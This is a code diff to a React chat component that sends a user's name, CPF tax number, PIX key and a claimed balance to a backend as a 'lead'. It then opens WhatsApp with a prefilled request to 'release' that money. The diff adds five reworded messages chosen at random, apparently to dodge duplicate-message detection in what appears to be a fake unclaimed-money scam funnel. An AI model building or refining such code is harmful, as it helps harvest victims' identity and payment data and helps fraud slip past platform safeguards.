@@ -500,7 +500,15 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
          body: JSON.stringify({ action: 'whatsapp', leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue })
       }).catch(console.error);
 
-      const message = encodeURIComponent(`Olá, sou o(a) ${leadName}. Quero liberar minha transferência do valor de ${leadValue} na minha conta.`);
+      const messages = [
+        `Olá, sou o(a) ${leadName}. Quero liberar minha transferência do valor de ${leadValue} na minha conta.`,
+        `Olá, meu nome é ${leadName}. Gostaria de solicitar a liberação do meu saldo de ${leadValue} que está pendente no sistema.`,
+        `Prezados, sou o(a) titular ${leadName}. Aguardo a liberação e transferência do meu saque no valor de ${leadValue}.`,
+        `Oi, fiz a consulta do meu saldo (${leadValue}) em nome de ${leadName} e vim concluir o processo para o recebimento do PIX.`,
+        `Olá! Sou o(a) ${leadName} e gostaria de ajuda para finalizar a liberação do meu valor a receber de ${leadValue}.`
+      ];
+      const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+      const message = encodeURIComponent(randomMsg);
       window.open(`https://wa.me/${waNumber}?text=${message}`, '_blank');
     }
   };
